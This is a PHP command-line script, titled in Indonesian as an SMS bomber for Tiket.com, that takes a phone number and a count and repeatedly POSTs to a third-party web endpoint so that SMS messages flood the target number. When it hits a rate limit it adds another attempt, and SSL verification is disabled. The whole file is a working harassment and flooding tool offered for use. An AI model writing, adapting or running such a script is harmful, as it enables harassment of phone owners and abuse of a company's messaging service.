<?php
sleep(1);
echo "\n\e[1;35m========================[ BOM SMS TIKET.COM ]========================\e[0m\r\n";
sleep(1);
echo "\nNOMOR HP 		: ";
$no = trim(fgets(STDIN, 1024));

echo "\nBERAPA SMS 		: ";
$loop = trim(fgets(STDIN, 1024));

echo "\n+---------------------[# HASIL #]----------------------+\n";
$no = '62'.substr(trim($no), 1);
for ($x=1; $x<=$loop; $x++) {
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, "https://idsystem404.000webhostapp.com/api/api-bomsmstiket.php?bomsms=".$no);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_POSTFIELDS, 1);
	curl_setopt($c, CURLOPT_POST, 1);
	$hasil = curl_exec($c);
	//FUNGSI FALSE
	if ($hasil == "Too Many Requests") {
		$loop += 1;
		echo "\e[91m$x. Code Failed To send :(\n\e[97mCount +1\n".($loop-$x)." Remaining\n\e[93mSleep in 60s\n";
		flush();		
	} else {
		echo "$x. NO HP : [ $no ] [ STATUS : \e[1;92mSUCCESS ]\e[0m    \n";
		flush();
	}
}
?>